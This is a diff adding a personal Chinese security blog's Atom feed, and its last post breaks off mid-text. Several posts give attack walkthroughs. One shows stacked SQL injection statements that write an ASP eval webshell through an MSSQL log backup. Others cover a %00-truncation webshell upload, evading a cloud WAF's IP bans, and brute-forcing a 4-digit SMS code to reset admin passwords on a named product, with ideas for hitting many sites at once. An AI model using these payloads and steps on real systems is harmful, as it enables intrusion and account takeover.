@@ -1,0 +1,457 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>sky666sec&#39;s blog</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2018-08-05T06:36:17.517Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>sky666</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>AliYunDun bypass</title>
+    <link href="http://yoursite.com/2018/06/04/AliYunDun%20bypass/"/>
+    <id>http://yoursite.com/2018/06/04/AliYunDun bypass/</id>
+    <published>2018-06-04T05:26:46.000Z</published>
+    <updated>2018-08-05T06:36:17.517Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604123700.png" alt=""></p><p>用阿里云的主机扫描阿里云的站点是不会封IP的。</p><a id="more"></a><p>随着越来越多的站点采用阿里云服务器，阿里云自带的云盾waf总是封ip就很讨厌了。</p><p>所以就想出了这招以其人之道还治其人之身的手法。</p><p>昨天我参考了xz的这篇文章</p><p><a href="https://exp10it.cn/2018/04/21/aliyun-waf-bypass.html" target="_blank" rel="noopener">https://exp10it.cn/2018/04/21/aliyun-waf-bypass.html</a></p><p>发现用阿里云的主机跑阿里云站点的注入，云盾确实是不封ip的。</p><p>于是我今天就想到如果我用扫描的方式,云盾它是不是也是不封ip的？</p><p><img src="https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/TIM%E5%9B%BE%E7%89%8720180604124809.png" alt=""></p><p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604125241.png?raw=true" alt=""></p><p>先用自己本机进行扫描测试，过了一会，果然封ip了。</p><p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604125446.png?raw=true" alt=""></p><p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604125656.png?raw=true" alt=""></p><p>于是用我的阿里云服务器再进行测试</p><p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604130920.png?raw=true" alt=""></p><p>不放我的ip，怕被日。（嘻嘻）</p><p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604123700.png?raw=true" alt=""></p><p>哈哈哈，扫完了，云盾根本不封ip的。</p><p>嫌麻烦，可以用阿里云的代理也行。</p><p>总结：<br>1、阿里云云盾的这个ip封禁策略就跟内外网一样，内网统统信任，外网就统一进行拦截，因为阿里云本身就是一个大的内网，所以这是没办法的事情。<br>2、学无止境，努力拼搏。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/TIM%E6%88%AA%E5%9B%BE20180604123700.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;用阿里云的主机扫描阿里云的站点是不会封IP的。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>今天对于电话面试的总结</title>
+    <link href="http://yoursite.com/2018/03/13/%E4%BB%8A%E5%A4%A9%E5%AF%B9%E4%BA%8E%E7%94%B5%E8%AF%9D%E9%9D%A2%E8%AF%95%E7%9A%84%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/03/13/今天对于电话面试的总结/</id>
+    <published>2018-03-12T17:31:08.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p>梦想还是要有的，万一实现了呢？</p><a id="more"></a><p>这是一家南京的安全公司，我找的人内推的我（水平不够，只好找人内推了。）</p><p>开头说了声会不会<code>APP</code>安全，看来这是趋势了，我说了正准备研究，有研究<code>APP</code>安全的打算。</p><p>首先面试官叫我作自我介绍，我说我主要研究<code>web</code>安全和内网渗透（感觉是根据我自我介绍来问的）</p><p>接着面试官问我搞<code>web</code>渗透的四大件是什么?(我当时就懵了)</p><p>还好我反问了面试官是指工具还是什么，他说不是工具。</p><p>于是我懵懵懂懂的回答了<code>web</code>容器、脚本语言、服务器系统版本，可惜我漏搭了数据库，因为当时整个人都是懵的，忘了。</p><p>紧接着，面试官又问我一般网站使用什么脚本语言，我说了，<code>asp</code>、<code>aspx</code>、<code>php</code>、<code>jsp</code>,他说有没有<code>python</code>写的,我说很少，估计面试官遇到过吧。</p><p>然后紧接着又问我<code>PHP</code>远程文件包含所需要的条件，我当时就说我不懂这个原理，你能给我说一下吗？面试官友好的回答了我。（感谢面试官）</p><p>后来我查了资料<br>RFI（远程文件包含）攻击需要同时具备三个条件（被攻击机器）：</p><p>1、<code>allow_url_fopen = On</code>    （默认开启）</p><p>2、<code>allow_url_include = On</code>  （默认关闭）</p><p>3、被包含的变量前没有目录的限制</p><p>还是学到了一些姿势。</p><p>这个面试官最后问了我关于<code>asp</code>的其他后缀名，我忘了那个<code>asa</code>。（真是抱歉，感觉好古老，一时又忘记了）。</p><p>之后换了个面试官。</p><p>他问了我一个难题，以前虽然看到过相关案例，但是自己没有实践，一时又想不起来。感谢这位面试官的耐心解答。</p><p>他问了我这样一个问题：如果你得到一台服务器但是只有很小的权限，只能执行简单的几个命令，而且服务器加固做的很好，不存在什么<code>exp</code>提权，数据库提权，第三方组件提权什么的，你该怎么做？而且服务器是在阿里云的情况下，不存在什么可以进行嗅探，<code>arp</code>欺骗的情况。</p><p>这可把我难倒了，我直接说我不知道了，你能说一下吗？</p><p>他是这样说的，利用一些高权限的<code>dll</code>等进程来进行提权，换言之就是利用服务器上运行的高权限服务及进程来进行提权。这个就有点技术含量了。（原谅萌新还不懂这个）。</p><p>好了，这样就算是电话面试完成了。叫我三到五天等结果。</p><p>最后没有三到五天，过了两个小时他们公司人事打电话给我，说技术部门的同事对我评价很高，叫我周五再到他们公司现场面试一下。（估计是跟人事聊聊人生理想吧）</p><p>祝我好运吧！</p><p>总结：</p><ul><li>面试能学到很多新的东西，还是自己了解不够，实践不够，还有很多东西不知道，还有很多姿势等着我们去挖掘去探索。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;梦想还是要有的，万一实现了呢？&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用mssql log备份得到webshell</title>
+    <link href="http://yoursite.com/2018/03/11/%E5%88%A9%E7%94%A8mssql%20log%E5%A4%87%E4%BB%BD%E5%BE%97%E5%88%B0webshell/"/>
+    <id>http://yoursite.com/2018/03/11/利用mssql log备份得到webshell/</id>
+    <published>2018-03-11T05:20:00.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p>感谢xz的耐心指导，让我学会了此手法。</p><p>开始我发现有个搜索框<code>sql</code>注入，然后一般常规的思路就是通过注入得到后台账号密码，最后通过上传漏洞得到<code>webshell</code>。但是<code>xz</code>却不是这样的，于是我问了他<code>getshell</code>的思路，他说是<code>mssql log</code>备份得到<code>webshell</code>的。</p><a id="more"></a><p>下面进入正题。</p><p>我们现在可以知道搜索框有个注入，那我们就可以利用这个搜索框注入。</p><p>注意搜索型注入要闭合</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fp8u0lclfbj30cn03tt8o.jpg" alt=""></p><p>具体图片我就不贴了，只说个思路。</p><blockquote><p>;alter database 数据库名称 set RECOVERY FULL–</p></blockquote><blockquote><p>;create table cmd (a image)–</p></blockquote><blockquote><p>;backup log 数据库名称 to disk = ‘d:/web/1.asp’ with init</p></blockquote><blockquote><p>;insert into cmd (a) values (‘&lt;% eval request(1) %&gt;’)–</p></blockquote><blockquote><p>;backup log 数据库名称 to disk = ‘d:/web/2.asp’–</p></blockquote><p>一定要分开依次执行上面的<code>sql</code>语句，不然会被注释掉</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp8tkk7i3sj30ee04o0tf.jpg" alt=""></p><p><code>1.asp</code> 保存数据库</p><p><code>2.asp</code>是木马</p><p>总结：</p><ul><li>我在操作过程中犯了很多错误，还是xz耐心指导我完成的。我发现要懂原理才行，要懂sql语句，不然连搜索型要闭合和被注释了都不知道，也不知道还有这种拿webshell的手法思路。懂原理方能更好的前进。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;感谢xz的耐心指导，让我学会了此手法。&lt;/p&gt;
+&lt;p&gt;开始我发现有个搜索框&lt;code&gt;sql&lt;/code&gt;注入，然后一般常规的思路就是通过注入得到后台账号密码，最后通过上传漏洞得到&lt;code&gt;webshell&lt;/code&gt;。但是&lt;code&gt;xz&lt;/code&gt;却不是这样的，于是我问了他&lt;code&gt;getshell&lt;/code&gt;的思路，他说是&lt;code&gt;mssql log&lt;/code&gt;备份得到&lt;code&gt;webshell&lt;/code&gt;的。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>通过HTTP头伪造IP</title>
+    <link href="http://yoursite.com/2018/03/10/%E9%80%9A%E8%BF%87HTTP%E5%A4%B4%E4%BC%AA%E9%80%A0IP/"/>
+    <id>http://yoursite.com/2018/03/10/通过HTTP头伪造IP/</id>
+    <published>2018-03-10T10:27:05.000Z</published>
+    <updated>2018-08-05T06:36:17.529Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp7xjdrzebj30b405kt8m.jpg" alt=""></p><a id="more"></a><p>以前做CTF看到过这种姿势，刚好又在xz博客看到了；就转载过记录一下。（其实是老发些没技术含量的没意思,23333）</p><p>在<code>CTF</code>比赛中会遇到一种题目，例如你的<code>IP</code>是来自德国的才可以拿到<code>flag</code>。所以，我们的思路就是进行数据包头欺骗，伪造我们的<code>IP</code>，骗过服务器。下面来说说伪造IP的几种方式。</p><blockquote><p>X-Originating-IP: 8.8.8.8</p></blockquote><blockquote><p>X-Forwarded-For: 8.8.8.8</p></blockquote><blockquote><p>X-Real-IP: 8.8.8.8</p></blockquote><blockquote><p>X-Remote-IP: 8.8.8.8</p></blockquote><blockquote><p>X-Remote-Addr: 8.8.8.8</p></blockquote><p>大多都跟反向代理有关</p><p><code>X-Originating-IP</code> 主要出现在邮件头里</p><p><code>X-Forwarded-For</code> 不多说 代理转发的 <code>IP</code></p><p><code>X-Real-IP</code> 跟 <code>X-Forwarded-For</code> 类似</p><p><code>X-Remote-IP</code> 和 <code>X-Remote-Addr</code> 远程主机的 <code>IP</code></p><p>因为都是从脚本层获取的 所以可以进行伪造</p><p><code>Modify Header Value</code> 插件</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp7xjutdhaj314t08dmxz.jpg" alt=""></p><p><code>PHP $_SERVER</code> 变量输出</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp7xkntsg9j3088037mx7.jpg" alt=""></p><p>转载自：<a href="https://exp10it.cn/index.php/archives/1056" title="xz" target="_blank" rel="noopener">https://exp10it.cn/index.php/archives/1056</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fp7xjdrzebj30b405kt8m.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>从元宵节点灯想到数据备份的重要性</title>
+    <link href="http://yoursite.com/2018/03/04/%E4%BB%8E%E5%85%83%E5%AE%B5%E8%8A%82%E7%82%B9%E7%81%AF%E6%83%B3%E5%88%B0%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/"/>
+    <id>http://yoursite.com/2018/03/04/从元宵节点灯想到数据备份的重要性/</id>
+    <published>2018-03-04T05:53:46.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0r0xt126j30tw0gpta0.jpg" alt=""></p><a id="more"></a><p>前几天博客我因为乱改了一部分文件，导致博客出现<code>bug</code>,页面文章半天加载不出来。开始我以为是被墙了，翻墙访问发现不是这个原因。最后找到了原因。因为我用博客备份文件对博客进行还原至上一次的操作，页面加载恢复正常，所以怀疑是博客文件出现问题。</p><p>紧接着国内两大医院遭受勒索病毒攻击，听说湖南省儿童医院是因为数据库有进行数据备份，所以才免遭数据库被加密而无法恢复的后果。</p><p>我家是农村，所以我需要去发灯。</p><p>我兴致昂昂的去发灯，开始还好，紧接着开始刮风了，灯点燃之后可能会灭。（这可不太好）</p><p>等我到了三楼，楼上的风刮的更大了。</p><p>开始我是这样想的，我先把这根灯点燃，然后迅速点燃那根灯，这样就有两盏灯了，即使灭了这跟灯，还有那根灯顶着。</p><p>然后我发现不对劲了，风越吹越大，导致这跟灭了，那根也开始灭了。</p><p>我一看不行，我心想，得找个没风的地方再点一个跟，免得都灭了。</p><p>然后我在房间里放了一根点燃的灯，这个有点类似于热备份。</p><p>热备份是在数据库运行的情况下，采用<code>archivelog mode</code>方式备份数据库的方法。即热备份是系统处于正常运转状态下的备份。</p><p>嗯，这下不怕了。</p><p>最后我发现灯基本全灭了，因为风越吹越大了。</p><p>我就采用热备份的方式，全部放到没风或者能挡风的地方。保障了灯的正常燃烧。</p><p>数据备份确实很重要！</p><p>所以我把我博客的源码及配置文件都进行了备份操作，本机自带有一份，<code>GitHub</code>一份，然后谷歌云端硬盘一份，当然还可以放其他地方。懒得放那么多地方，一式三份算是基本可以了。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0rt2jjtmj30v40h2dhz.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0r0xt126j30tw0gpta0.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0rtblww7j30zn0hvq3q.jpg" alt=""></p><p>我这样的目的，就是想像分布式/区块链那样，即使我的这份文件数据丢失了，但是那个地方还是保存有我的数据备份文件。</p><p>总结：</p><ul><li>认识到了数据备份的重要性</li><li>采用分布式的云备份手段来备份数据</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fp0r0xt126j30tw0gpta0.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHPWEB重装漏洞+%00截断拿webshell</title>
+    <link href="http://yoursite.com/2018/03/04/PHPWEB%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E+00%E6%88%AA%E6%96%AD%E6%8B%BFwebshell/"/>
+    <id>http://yoursite.com/2018/03/04/PHPWEB重装漏洞+00截断拿webshell/</id>
+    <published>2018-03-04T05:02:19.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fp0qgdv9rrj310q0h7t9r.jpg" alt=""></p><a id="more"></a><p>首先我们看到需要数据库服务器地址</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0pct202uj31180i9js4.jpg" alt=""></p><p>那么我们就自己搭建一台数据库服务器。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0pe0y0lvj311y0kg3ze.jpg" alt=""></p><p>继续下一步</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0pfmxr5cj311b0ie40v.jpg" alt=""></p><p>接下来我们可以重置后台管理员密码</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0pgsaengj310s0i0mxs.jpg" alt=""></p><p>重置管理员密码成功</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0phw1i3wj311d0i6mxr.jpg" alt=""></p><p>正如安装完成的提示所说，请删除【install】目录（可是大部分安全意识不强的站长并没有删除，啪啪啪，打脸了）。</p><p>成功进入后台管理系统</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fp0pjyv5kwj311g0i6gsy.jpg" alt=""></p><p><code>phpweb `</code>cms` 添加文章上传存在经典的%00截断漏洞。</p><p>截断的产生核心，就是<code>chr(0)</code>字符 。</p><p>这个字符即不为空<code>(Null)</code>，也不是空字符<code>(&quot;&quot;)</code>，更不是空格！</p><p>当程序在输出含有<code>chr(0)</code>变量时，<code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</p><p>在<code>php 5.3.4</code>中修复了<code>0</code>字符，但是在之前的版本中仍然危害巨大。</p><p>简单测试一下 (<code>PHP</code> 版本<code>&lt;5.3.4</code>)</p><blockquote><p>&lt;?php</p></blockquote><blockquote><p>$data = $_GET[“filename”]`;</p></blockquote><blockquote><p>echo $data;</p></blockquote><blockquote><p>?&gt;</p></blockquote><p><code>url</code>中输入<code>xx.php?filename=test.php%00.txt</code>，实际输出为<code>test.php</code>.</p><p>常见利用方法：</p><ul><li>1.上传时路径可控，使用00截断</li><li>2.文件下载时，00截断绕过白名单检查</li><li>3.文件包含时，00截断后面限制(主要是本地包含时)</li><li>4.其它与文件操作有关的地方都可能使用00截断</li></ul><p>下面请看实例</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp0qcv8ydsj30a603jq2w.jpg" alt=""></p><p>成功拿到webshell</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fp0qgdv9rrj310q0h7t9r.jpg" alt=""></p><p>总结： </p><blockquote><p>正如安装完成的提示所说，请删除【install】目录。</p></blockquote><blockquote><p>及时升级php版本以便修复缺陷。</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53ly1fp0qgdv9rrj310q0h7t9r.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>small target</title>
+    <link href="http://yoursite.com/2018/02/17/Small%20target/"/>
+    <id>http://yoursite.com/2018/02/17/Small target/</id>
+    <published>2018-02-17T01:48:33.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p>小目标</p><a id="more"></a><ol><li>python 1000个练习题（每天1-2个）          (1h)    &nbsp;      -&gt;  &nbsp; 一个可以完全运行的demo</li></ol><ol start="2"><li>学会安装 linux(ubuntu centos kali …)    (2h)     &nbsp;     -&gt; &nbsp; 产出物(md 安装文档)</li></ol><ol start="3"><li>安装Linux相关服务(至少10个)并且实现源码自动化安装(1h) &nbsp;  -&gt;  &nbsp;shell script</li></ol><ol start="4"><li>代码规范                                  (10min)  &nbsp;     -&gt; &nbsp; 阅读Google文档</li></ol><ol start="5"><li>下载金山打字通，每天练习英文打字速度      (10min)   &nbsp;    -&gt;  &nbsp;200/min  99%</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;小目标&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MarkdownPad2常用快捷键</title>
+    <link href="http://yoursite.com/2018/02/17/MarkdownPad2%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    <id>http://yoursite.com/2018/02/17/MarkdownPad2常用快捷键/</id>
+    <published>2018-02-17T01:47:48.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p>MarkdownPad2常用快捷键</p><a id="more"></a><p><code>Ctrl + I</code> ： 斜体</p><p><code>Ctrl + B</code> ： 粗体</p><p><code>Ctrl + G</code> ： 图片</p><p><code>Ctrl + Q</code>： 引用<br><code>Ctrl + 1</code> ： 标题 1</p><p><code>Ctrl + 2</code> ： 标题 2<br><code>Ctrl + 3</code> ： 标题 3</p><p><code>Ctrl + K</code> ： 代码块</p><p><code>Ctrl + L</code>： 超链接</p><p><code>Ctrl + T</code> ： 时间戳</p><p><code>Ctrl + U</code> ： 无序列表</p><p><code>Ctrl + R</code> ： 水平标尺</p><p><code>F4</code> ： 启用水平布局</p><p><code>F5</code> ： 启用实时预览</p><p><code>F6</code> ： 在浏览器中预览</p><p><code>Ctrl + Shift + O</code> ： 有序列表</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;MarkdownPad2常用快捷键&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>云梦微站通用漏洞之任意管理员密码重置</title>
+    <link href="http://yoursite.com/2018/02/12/%E4%BA%91%E6%A2%A6%E5%BE%AE%E7%AB%99%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
+    <id>http://yoursite.com/2018/02/12/云梦微站通用漏洞之任意管理员密码重置/</id>
+    <published>2018-02-12T13:23:22.000Z</published>
+    <updated>2018-08-05T06:36:17.529Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzt7ssduj31110injt0.jpg" alt=""></p><a id="more"></a><p>由于漏洞发生在服务商，所以此漏洞属于通用漏洞，所有使用云梦微站产品的网站都能利用。</p><p>首先我对一个网站进行查询，发现使用的是云梦微站产品。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzh50jx3j311w0h6gnh.jpg" alt=""></p><p>然后我对他进行测试发现，云梦微站的云控制台忘记密码存在一个逻辑缺陷，可以重置管理员的密码，进而可以直接进入网站管理后台、更换账号及密码、操作网站续费、创建员工账号及设置网站管理权限等操作。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzhpumfrj30wj0gdn08.jpg" alt=""></p><p>云梦微站忘记密码需要输入手机号，对于大部分使用云梦微站产品的网站而言。手机号我们是不知道的。那我们要怎么才能知道呢？</p><p>于是我利用阿里云和云梦微站的功能缺陷查到了。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodziba26yj30et07iq4c.jpg" alt=""></p><p>由于使用云梦微站产品的网站域名大部分都是在阿里云万网买的，所以忘记会员名功能可以帮助我们找到手机号。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodziyer71j30pr0clgmb.jpg" alt=""></p><p>我们选择域名找回功能。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzjgmpw2j30r40873yx.jpg" alt=""></p><p>这样我们就找到了手机号前三位及后四位。</p><p>这下子只要知道中间四位就行了</p><p>云梦微站的功能缺陷就是会验证手机号是否存在，存在无提示，但是不存在会在页面提示手机号不存在。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzjyrzsbj30l6047q2t.jpg" alt=""></p><p>于是我们可以用burp抓包爆破不知道的手机号中间四位。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzkg2ob9j30ns0jiwfh.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzkvxx7cj30jo07vwes.jpg" alt=""></p><p>提示没有了，继续下一步。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzlm62v3j30sd0gddki.jpg" alt=""></p><p>缺陷就在此处，经过测试发现，重置密码的短信验证码只有四位数。</p><p>所以我们可以获取验证码之后，用burp进行抓包爆破获取的短信验证码。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzm9fpl9j30ww0ajab5.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzmqh0myj30ns0jiq4y.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzngyglaj30vh0gtjwo.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzokuepyj30qs0hnju7.jpg" alt=""></p><p>安全性再高的密码也抵不过一个四位数的短信验证码啊！</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzpcv4nfj30r00fijvc.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzq1usw2j311r0jdgnq.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzqqjs74j311g0j67ef.jpg" alt=""></p><p>所有采用云梦微站产品的网站都可以利用我上面的思路重置管理员密码。</p><p>批量的话，有两个思路，一个是通过构造关键字用搜索引擎进行查找，另一个是通过爆破手机号的方式。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzs4x0syj30iy0fwdig.jpg" alt=""></p><p>这是爆破某一个站的手机号时，无意中把其他使用云梦微站产品的网站手机号给爆破出来了。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzssp8pxj30ns0jit9o.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fodzt7ssduj31110injt0.jpg" alt=""></p><p>总结：</p><ul><li>安全性再高的密码也抵不过一个四位数的短信验证码啊！</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fodzt7ssduj31110injt0.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python系统命令调用</title>
+    <link href="http://yoursite.com/2018/02/08/Python%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E8%B0%83%E7%94%A8/"/>
+    <id>http://yoursite.com/2018/02/08/Python系统命令调用/</id>
+    <published>2018-02-08T13:28:00.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo9eb6x7uyj31240o0jsi.jpg" alt=""></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Python 3</code>不再推荐使用老的<code>os.system()</code>、<code>os.popen()</code>、<code>commands.getstatusoutput()</code>等方法来调用系统命令，而建议统一使用<code>subprocess</code>库所对应的方法如：<code>Popen()</code>、<code>getstatusoutput()</code>、<code>call()</code>。</p><p>推荐并记录一些常用的使用范例：</p><h3 id="Popen"><a href="#Popen" class="headerlink" title="Popen"></a>Popen</h3><blockquote><p>import subprocess</p></blockquote><blockquote><p>try:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp; proc = subprocess.Popen([<code>ls</code>, <code>-a</code>, <code>/</code>], stdout=subprocess.PIPE)</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp; print(proc.stdout.read())  </p></blockquote><blockquote><p>except:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp; print(“error when run <code>ls</code> command”)</p></blockquote><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><blockquote><p>import subprocess</p></blockquote><blockquote><p>try:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp; retcode = subprocess.call(“mycmd” + “ myarg”, shell=True)<br>&nbsp;&nbsp;&nbsp;&nbsp; if retcode &lt; 0:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp; print(“Child was terminated by signal”, -retcode, file=sys.stderr)</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;  else:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;        print(“Child returned”, retcode, file=sys.stderr)</p></blockquote><blockquote><p>except OSError as e:</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;    print(“Execution 